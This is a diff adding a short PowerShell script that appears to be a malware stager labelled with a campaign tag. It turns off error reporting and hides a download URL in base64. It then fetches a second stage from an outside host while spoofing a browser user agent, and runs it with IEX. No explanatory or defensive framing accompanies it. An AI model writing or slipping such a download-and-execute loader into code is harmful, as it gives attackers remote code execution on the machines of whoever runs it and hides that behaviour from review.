@@ -1,0 +1,8 @@
+$ErrorActionPreference = 'SilentlyContinue'
+$tag = "NJ-CAMPAIGN-0x5A"
+$b = "aHR0cDovL2Nkbi5uaWdodGphci11cGRhdGUuZXhhbXBsZS9zdGFnZTI="
+$u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b))
+$w = New-Object Net.WebClient
+$w.Headers.Add("User-Agent","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)")
+IEX ($w.DownloadString($u))
+Start-Sleep -Seconds 30
